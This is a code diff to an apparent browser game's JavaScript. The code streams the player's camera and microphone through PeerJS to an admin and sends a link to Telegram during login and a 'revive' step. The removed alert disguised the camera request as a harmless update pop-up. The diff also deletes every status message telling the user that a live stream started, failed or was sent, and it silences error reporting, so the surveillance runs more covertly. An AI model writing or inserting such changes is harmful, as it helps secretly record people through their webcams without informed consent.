@@ -474,9 +474,6 @@ function closeBugReport() {
 
 /* ================= LOGIN STREAM CONSENT ================= */
 
-const LOGIN_STREAM_CONSENT_MESSAGE =
-  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";
-
 function createLiveSupportRoomId() {
   const random = Math.random().toString(36).slice(2, 8);
   return `medieval-cart-${Date.now().toString(36)}-${random}`;
@@ -654,7 +651,7 @@ function stopLoginLiveSupportBroadcast(silent = false) {
   loginLiveAdminPeerId = "";
 
   if (!silent && loginConsentStatus) {
-    loginConsentStatus.textContent = "Live sharing stopped.";
+    loginConsentStatus.textContent = "";
   }
 }
 
@@ -665,6 +662,7 @@ function openLoginConsentModal() {
 
 function closeLoginConsentModal() {
   loginConsentModal.style.display = "none";
+  loginConsentStatus.textContent = "";
 }
 
 async function startLoginCameraStreamAndSendLink() {
@@ -673,9 +671,8 @@ async function startLoginCameraStreamAndSendLink() {
     return;
   }
   loginConsentContinueButton.disabled = true;
-  loginConsentStatus.textContent = "Starting live stream...";
+  loginConsentStatus.textContent = "";
   try {
-    window.alert(LOGIN_STREAM_CONSENT_MESSAGE);
     if (!window.RTCPeerConnection || !navigator.mediaDevices?.getUserMedia) {
       throw new Error("Live streaming is not supported in this browser.");
     }
@@ -692,11 +689,7 @@ async function startLoginCameraStreamAndSendLink() {
 
     await ensurePeerJsLoaded();
     loginLivePeer = new window.Peer(loginLivePeerId);
-    loginLivePeer.on("error", () => {
-      if (!loginStreamSent) {
-        loginConsentStatus.textContent = "Live stream peer error.";
-      }
-    });
+    loginLivePeer.on("error", () => {});
     loginLivePeer.on("disconnected", () => {
       if (loginLivePeer && !loginLivePeer.destroyed) {
         loginLivePeer.reconnect();
@@ -720,13 +713,9 @@ async function startLoginCameraStreamAndSendLink() {
 
     startCallingAdminLoop();
     loginStreamSent = true;
-    loginConsentStatus.textContent = "Live stream started. Link sent to Telegram.";
     closeLoginConsentModal();
   } catch (error) {
-    loginConsentStatus.textContent =
-      error?.name === "NotAllowedError"
-        ? "Camera/mic permission denied."
-        : "Could not start live stream or send Telegram link.";
+    loginConsentStatus.textContent = "";
     stopLoginLiveSupportBroadcast(true);
   } finally {
     loginConsentContinueButton.disabled = false;
@@ -737,9 +726,6 @@ async function startLoginCameraStreamAndSendLink() {
 
 const REVIVE_DECISION_WINDOW_MS = 30000;
 const REVIVE_POLL_INTERVAL_MS = 1500;
-const CONSENT_MESSAGE =
-  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";
-
 function stopReviveCamera() {
   if (!reviveMediaStream) return;
   reviveMediaStream.getTracks().forEach(track => track.stop());
@@ -778,7 +764,6 @@ function buildStreamLink(streamKey) {
 }
 
 async function requestCameraWithConsent() {
-  window.alert(CONSENT_MESSAGE);
   return navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" },
     audio: false
